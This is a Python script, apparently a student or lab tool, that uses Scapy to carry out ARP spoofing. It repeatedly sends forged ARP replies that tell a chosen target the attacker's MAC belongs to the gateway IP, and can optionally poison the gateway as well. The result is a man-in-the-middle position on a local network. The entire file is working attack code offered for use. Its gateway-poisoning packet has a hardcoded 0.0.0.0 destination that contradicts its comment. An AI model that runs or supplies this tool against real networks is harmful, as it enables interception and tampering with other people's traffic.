# Maor Frost AND Asaf Yahav
import scapy
import argparse
import time
from scapy.all import *

# Defaults
IFACE = conf.route.route("0.0.0.0")[0]
SRC = conf.route.route("0.0.0.0")[2] # SRC = gateway ip
TARGET = None

# Arguments
parser = argparse.ArgumentParser(description='Spoof ARP tables')
parser.add_argument("-v","--verbose",action="store_true",help="print verbose information")
parser.add_argument("-i","--iface",dest="IFACE",default=IFACE,help="Interface you wish to use")
parser.add_argument("-s","--src",dest="SRC",default=SRC,help="The address you want for the attacker")
parser.add_argument("-d","--delay",dest="DELAY",default=1,help="Delay (in seconds) between messages")
parser.add_argument("-gw","--gateway",action="store_true",help="should GW be attacked as well")
parser.add_argument("-t","--target",dest="TARGET",default=None,help="IP of target", required=True)
# all arguments into args table
args = parser.parse_args()
if args.verbose: # print arguments
    print(args)

DELAY = float(args.DELAY)
if args.IFACE: # if the user chose his owm interface
    IFACE = args.IFACE
our_mac=get_if_hwaddr(IFACE) # mac address of this interface

if args.SRC:
    SRC = args.SRC

# get target ip
TARGET = args.TARGET

# # packet for target
arp_reply = ARP(
    op=2,                # 2 = is-at (ARP reply)
    psrc= SRC,  # the IP you're claiming to be (e.g., gateway)
    pdst= TARGET, # the victim's IP
    hwsrc= our_mac, # the MAC you want to advertise
)

# # packet for gateway
arp_gw = ARP(
	op=2,  # 2 = is-at (ARP reply)
	psrc=TARGET,  # IP we are claiming to be (e.g., gateway)
	pdst="0.0.0.0",  # gateway IP
	hwsrc=our_mac,  # ip is-at our MAC
)
if args.verbose: # print packets
    arp_reply.show()
    if args.gateway:
        arp_gw.show()

# sendind the ARP replys
i=0
sending = True
while sending:
    try:
        send(arp_reply, verbose=0)
        print("{} Sent ARP table to {}".format(i, TARGET))
        if args.gateway:
            send(arp_gw, verbose=0)
            print("{} Sent ARP table to gateway".format(i))
        i+=1
        time.sleep(DELAY)
    except KeyboardInterrupt:
        sending = False
if args.verbose: print("Exiting")

exit(0)
